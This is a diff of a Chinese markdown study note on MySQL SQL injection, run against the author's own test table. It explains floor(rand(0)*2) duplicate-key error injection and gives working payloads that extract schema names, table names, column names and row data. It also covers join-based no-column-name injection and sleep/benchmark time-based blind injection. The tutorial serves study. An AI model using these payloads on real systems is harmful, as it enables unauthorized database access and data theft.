@@ -36,7 +36,7 @@ mysql在报错信息里可能会带有部分数据,利用这一特性进行注�
 
 报错注入主要有以下几种
 
-1. 数据类型溢出
+#### 数据类型溢出
 
 在mysql版本大于`5.5`时才会产生溢出报错
 
@@ -91,7 +91,7 @@ select !floor((select*from(select @@version)x))-~0;
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211417654.png)
 
-2. 特殊的数学函数
+#### 特殊的数学函数
 
 几何对象函数
 
@@ -116,7 +116,7 @@ select ST_PointFromGeoHash((select*from(select*from(select @@version)x)y),1);
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211435901.png)
 
-3. xpath语法错误
+#### xpath语法错误
 
 `ExtractValue()`和`UpdateXML()`
 
@@ -133,15 +133,177 @@ select extractvalue(1,concat(0x7e,(select @@version),0x7e));
 
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211521265.png)
 
-4. 主键/列名重复报错
+#### 重复数据报错
 
+主键具有唯一性,主键重复则会报错
 
->todo
+```
+select * from table3;
++----+------+
+| id | info |
++----+------+
+| 1  | a    |
+| 2  | a    |
+| 3  | b    |
+| 4  | c    |
+| 5  | c    |
++----+------+
+```
 
+`select count(*) from table3 group by info;`
+
+首先建立一个空的虚拟表
+
+|info(primary key)|count|
+|:---:|:---:|
+|||
+
+从数据库中查询数据,检查虚拟表是否存在对应条目,不存在则插入新记录,存在则count字段加1
+
+|info(primary key)|count|
+|:---:|:---:|
+|a|1|
+
+|info(primary key)|count|
+|:---:|:---:|
+|a|2|
+
+|info(primary key)|count|
+|:---:|:---:|
+|a|2|
+|b|1|
+
+|info(primary key)|count|
+|:---:|:---:|
+|a|2|
+|b|1|
+|c|1|
+
+|info(primary key)|count|
+|:---:|:---:|
+|a|2|
+|b|1|
+|c|2|
+
+`rand()`不能接在`order by/group by`后面
+
+[https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand](https://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_rand)
+
+RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations
+
+Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result
+
+```
+select floor(rand(0)*2) from `TABLES` limit 8;
++------------------+
+| floor(rand(0)*2) |
++------------------+
+| 0.0              |
+| 1.0              |
+| 1.0              |
+| 0.0              |
+| 1.0              |
+| 1.0              |
+| 0.0              |
+| 0.0              |
++------------------+
+```
+
+`select count(*) from table3 group by floor(rand(0)*2);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212150136.png)
+
+>`group by`只有在插入虚拟表时才会计算rand,更新时不会计算
+
+首先,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表为空,进行插入操作,此时`floor(rand(0)*2)`结果为`1`
+
+已执行两次`rand`计算
+
+|primary key|count|
+|:---:|:---:|
+|1|1|
+
+然后,`group by floor(rand(0)*2)`被执行确定为`group by 1`,此时虚拟表存在该项`count+1`
+
+已执行三次`rand`计算
+
+|primary key|count|
+|:---:|:---:|
+|1|2|
+
+然后,`group by floor(rand(0)*2)`被执行确定为`group by 0`,此时虚拟表不存在该项,进行插入操作,此时`floor(rand(0)*2)`结果为`1`,将要插入`1`但是此时虚拟表已存在`1`,因此主键冲突产生报错
+
+已执行五次`rand`计算
+
+因此表中需要有至少三条数据供`floor(rand(0)*2)`达到报错条件
+
+```
+select floor(rand(14)*2) from `TABLES` limit 4;
++-------------------+
+| floor(rand(14)*2) |
++-------------------+
+| 1.0               |
+| 0.0               |
+| 1.0               |
+| 0.0               |
++-------------------+
+```
+
+>floor(rand(14)*2)产生随机序列1010...,因此表中可以只有两条数据
+
+>如何利用该报错?
+
+爆破库名
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)y);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212218318.png)
+
+爆破表名
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212222673.png)
+
+爆破列名
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='table3' limit 1,1),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212227064.png)
+
+爆破字段
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select group_concat(id) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+`select * from table3 where id='1' and (select 1 from (select count(*),concat(0x7e,(select mid(group_concat(info),1,100) from table3),0x7e,floor(rand(0)*2))x from information_schema.schemata group by x)y);`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212338165.png)
+
+```
+select column_name,column_type from information_schema.columns where table_name='table3';
++-------------+--------------+
+| column_name | column_type  |
++-------------+--------------+
+| id          | int(11)      |
+| info        | varchar(255) |
++-------------+--------------+
+```
 
 ---
 
-mysql列名重复会报错,利用这一特性可以进行无列名注入
+列名具有唯一性,列名重复则会报错,利用这一特性可以进行无列名注入
 
 >例子
 
@@ -152,5 +314,68 @@ mysql列名重复会报错,利用这一特性可以进行无列名注入
 ![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211544831.png)
 
 >无列名注入
+
+[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)
+
+通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)
+
+`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)
+
+```
+select * from(select * from table1 as a join table1 as b)c;
+select * from(select * from table1 as a join table1 as b using (id))c;
+select * from(select * from table1 as a join table1 as b using (id,username))c;
+```
+
+#### 调用不存在的函数
+
+```
+select misaka();
+(1305, 'FUNCTION sql_injection_test.misaka does not exist')
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212343727.png)
+
+>json gtid uuid todo
+
+
+
+
+### 延时注入
+
+构造延时注入语句,根据服务器响应时间判断数据是否符合预期,常用于盲注
+
+1. sleep
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212353818.png)
+
+`select * from table3 where id='1' and if (length(database())>5,sleep(5),1)#`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201212355619.png)
+
+`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,sleep(5),1)#`
+
+2. benchmark
+
+`BENCHMARK(count,exp)`重复执行`count`次`exp`中的内容,其返回值为0
+
+```
+SELECT BENCHMARK(1000000,1+1);
++------------------------+
+| BENCHMARK(1000000,1+1) |
++------------------------+
+| 0                      |
++------------------------+
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201220004326.png)
+
+`select * from table3 where id='1' and if (ascii(substr((select group_concat(info) from table3),1,1))>50,benchmark(10e7,1+1),1)#`
+
+3. 笛卡尔积
 
 >todo
